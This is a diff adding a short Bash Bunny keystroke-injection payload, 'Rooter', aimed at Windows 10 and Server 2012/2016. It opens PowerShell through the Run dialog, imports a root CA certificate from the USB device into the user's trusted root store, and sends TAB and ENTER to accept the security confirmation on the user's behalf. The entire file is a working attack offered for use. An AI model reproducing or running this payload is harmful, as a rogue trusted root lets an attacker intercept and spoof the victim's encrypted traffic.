@@ -1,0 +1,27 @@
+#!/bin/bash
+#
+# Title:         Rooter
+# Author:        JRSmile
+# Version:       0.1
+# Target:        Windows Server 2012+2016+10
+# Props:         Hak5Darren/HAK5
+#
+# Executes a hidden powershell script that imports a root CA
+#
+
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
+
+LED R
+ATTACKMODE HID STORAGE
+# adapt language to your region
+DUCKY_LANG de
+QUACK GUI r
+QUACK DELAY 100
+QUACK STRING "powershell Import-Certificate -CertStoreLocation cert:\CurrentUser\Root -FilePath ((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\\root.cer')"
+QUACK ENTER
+# Popup for Confirmation has to be acnowledged, alt-j in german alt-y in english (tab enter should work everytime)
+QUACK DELAY 2000
+QUACK TAB
+QUACK ENTER
+LED G
